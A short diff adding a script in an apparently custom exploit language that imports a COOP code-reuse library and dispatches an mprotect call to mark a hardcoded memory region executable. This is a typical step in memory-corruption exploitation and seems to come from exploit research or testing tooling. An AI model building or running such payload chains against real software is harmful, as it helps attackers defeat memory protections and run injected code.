@@ -1,0 +1,9 @@
+IMPORT "esl_scripts/lib_coop.esl";
+
+DISPATCHER {
+    int mprotect = 0x7ffff790a770;
+    int target = 0xa0000000;
+    int len = 0xa0000000;
+    int protexec = 0x4;
+    EXECUTE_THREE_ARGS(mprotect, target, len, protexec);
+}
